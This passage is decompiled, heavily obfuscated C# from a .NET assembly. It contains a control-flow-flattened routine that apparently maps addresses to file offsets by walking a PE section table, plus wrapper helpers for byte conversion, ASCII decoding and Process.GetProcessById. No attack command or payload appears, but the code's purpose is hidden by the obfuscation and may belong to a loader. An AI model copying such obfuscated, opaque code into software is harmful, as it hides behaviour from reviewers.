		return YtQ7S2k5l1bc(YNANNX0OW8dt, aeBS8YFvFkMh, k09WQWMHfzQf, GEVOPzoMQP05);
	}

	private uint YtQ7S2k5l1bc(byte[] B0Ax0fOjlT6k, uint AeBS8YFvFkMh, ushort K09WQWMHfzQf, uint ic1EQ6BIFlPJ)
	{
		uint result = (uint)_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3544027488u);
		uint num5 = default(uint);
		uint num4 = default(uint);
		uint num6 = default(uint);
		uint num10 = default(uint);
		while (true)
		{
			int num = -333716411;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(-(~(~num2 * -158661169)) - -517372356)) % 12u)
				{
				case 11u:
					num5 = (uint)_003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(1143276503u);
					num = (int)(num3 * 1291972989) ^ -137120572;
					continue;
				case 10u:
				{
					int num9;
					if (num4 < K09WQWMHfzQf * _003CModule_003E.hhxFDPmIHoufoEIvTzswdgBraYsK<int>(191669019u))
					{
						num = 705407420;
						num9 = 705407420;
					}
					else
					{
						num = 207011275;
						num9 = 207011275;
					}
					continue;
				}
				case 8u:
				{
					int num11;
					int num12;
					if (ic1EQ6BIFlPJ < num6 + num10)
					{
						num11 = -1474413070;
						num12 = -1474413070;
					}
					else
					{
						num11 = 1848738324;
						num12 = 1848738324;
					}
					num = num11 ^ (int)(num3 * 1583250052);
					continue;
				}
				case 7u:
					num6 = (uint)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(3796529857u);
					num10 = (uint)_003CModule_003E.UNpeudLVrCeWTfHRAripDTEZGeucb<int>(2294405019u);
					num = (int)(num3 * 207522040) ^ -733222415;
					continue;
				case 6u:
					num4 += (uint)_003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(1345876438u);
					num = 1866249972;
					continue;
				case 4u:
					result = ic1EQ6BIFlPJ - num6 + num5;
					num = (int)((num3 * 1646634860) ^ 0x1FEF6C6B);
					continue;
				case 3u:
					num4 = (uint)_003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(1143276503u);
					num = (int)(num3 * 1904216738) ^ -1092555661;
					continue;
				case 2u:
					num6 = E7d1XEuKBRaB(B0Ax0fOjlT6k, AeBS8YFvFkMh + num4 + (uint)_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(909203111u));
					num10 = E7d1XEuKBRaB(B0Ax0fOjlT6k, AeBS8YFvFkMh + num4 + (uint)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(2094754346u));
					num = -1389754334;
					continue;
				case 1u:
					num = ((int)num3 * -798737733) ^ 0x6556E20B;
					continue;
				case 0u:
				{
					num5 = E7d1XEuKBRaB(B0Ax0fOjlT6k, AeBS8YFvFkMh + num4 + (uint)_003CModule_003E.jvPOUHKshbGFGQgOLofQnirJPPcO<int>(1445892226u));
					int num7;
					int num8;
					if (ic1EQ6BIFlPJ >= num6)
					{
						num7 = -332679386;
						num8 = -332679386;
					}
					else
					{
						num7 = 1277857068;
						num8 = 1277857068;
					}
					num = num7 ^ (int)(num3 * 1896145851);
					continue;
				}
				case 9u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private ushort sZwqZ30PqPdC(byte QjOMWUpTbmDk, byte byte_0)
	{
		byte[] array = new byte[_003CModule_003E.aizjhVmfLUVdUONSWEziAeATgcHAA<int>(3848993302u)];
		array[_003CModule_003E.oTVdMrsIOBMvvseqmKqvOhdYcLam<int>(1157660488u)] = QjOMWUpTbmDk;
		array[_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(1669414603u)] = byte_0;
		return W7h8mXtAeGxR.jutuBaNZSApBTPMbSfXkodQTJUqO(array, _003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(1143276503u));
	}

	private ushort PatpZowgVYED(byte[] hx9poZqrcAho, uint LlGcLUXhU9bu)
	{
		return sZwqZ30PqPdC(hx9poZqrcAho[LlGcLUXhU9bu], hx9poZqrcAho[(int)LlGcLUXhU9bu + _003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(1370470487u)]);
	}

	private uint jFrYBH26Ebio(byte Ud4hfb3vCic2, byte pV7OLhdhrg3v, byte LTcbEI6i2Nzg, byte CAitM964KkQg)
	{
		byte[] array = new byte[_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3600386134u)];
		array[_003CModule_003E.jvPOUHKshbGFGQgOLofQnirJPPcO<int>(3646087994u)] = Ud4hfb3vCic2;
		array[_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(1370470487u)] = pV7OLhdhrg3v;
		array[_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(2978023270u)] = LTcbEI6i2Nzg;
		array[_003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(716702096u)] = CAitM964KkQg;
		return W7h8mXtAeGxR.mySxyKxcXmbFeqhWmsbZLJNiegSS(array, _003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3544027488u));
	}

	public uint E7d1XEuKBRaB(byte[] byte_0, uint A1NPUHdwIoul)
	{
		return jFrYBH26Ebio(byte_0[A1NPUHdwIoul], byte_0[(int)A1NPUHdwIoul + _003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(3902099270u)], byte_0[(int)A1NPUHdwIoul + _003CModule_003E.UNpeudLVrCeWTfHRAripDTEZGeucb<int>(3264685017u)], byte_0[(int)A1NPUHdwIoul + _003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(2975240630u)]);
	}

	static Process wHwUgbefPvYAVudmmKMuUsczWLeL(int int_0)
	{
		return Process.GetProcessById(int_0);
	}

	static int pRXKZRZCCorpByYQbLuFTKYswZEK(Process process_0)
	{
		return process_0.Id;
	}

	static Type uXDvaNPssQJaSZqpbDiYgZnakjtpA(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static int nsSCMfeqsuUEyDLMIhepHjWEFtswB(Type type_0)
	{
		return Marshal.SizeOf(type_0);
	}

	static Encoding JyiwSChPtXtQvuEptOduyEFJRquc()
	{
		return Encoding.ASCII;
	}

	static string zVOhnZLtquukkQjFmgojCRbvchnc(Encoding encoding_0, byte[] byte_0, int int_0, int int_1)
	{
		return encoding_0.GetString(byte_0, int_0, int_1);
	}

	static int OlqFieAjAStQJQntaDlCkjLUUnBGA(string string_0, string string_1)
	{
		return string.Compare(string_0, string_1);
	}

	static ushort jutuBaNZSApBTPMbSfXkodQTJUqO(byte[] byte_0, int int_0)
	{
		return BitConverter.ToUInt16(byte_0, int_0);
	}

	static uint mySxyKxcXmbFeqhWmsbZLJNiegSS(byte[] byte_0, int int_0)
	{
		return BitConverter.ToUInt32(byte_0, int_0);
	}
}
